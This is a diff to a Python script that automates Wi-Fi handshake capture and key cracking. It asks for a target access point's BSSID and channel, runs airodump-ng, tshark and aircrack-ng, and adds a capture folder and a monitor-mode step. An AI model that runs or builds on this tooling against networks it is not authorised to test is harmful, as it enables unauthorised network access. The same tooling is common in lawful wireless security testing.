@@ -4,12 +4,19 @@ import os
 import subprocess
 import time
 from datetime import datetime
+from monitor import main as monitor_main
 
 # Run as root
 
+#if os.geteuid() != 0:
+#    print("Please run as root")
+#    exit(1)
+
+CAP_DIR = "CaptureFiles"  
+
 def inputs():
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    file_name = f"capture_{timestamp}"
+    file_name = f"{CAP_DIR}/capture_{timestamp}"
     bssid = input("Enter target AP BSSID: ")
     channel = int(input("Enter target AP channel: "))
 
@@ -17,6 +24,7 @@ def inputs():
 
 def airodump(file_name, bssid, channel):
     """Starts airodump-ng and waits for the capture file to appear."""
+
     cap_file = f"{file_name}-01.cap"
     airodump_cmd = ["airodump-ng", "-d", bssid, "-c", str(channel), "-w", file_name, "wlan1"]
     airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -73,5 +81,6 @@ def crack(cap_file):
     print(aircrack_proc.stdout)
 
 if __name__ == '__main__':
-    cap_file = tshark()
-    crack(cap_file)
+    if monitor_main():
+        cap_file = tshark()
+        crack(cap_file)
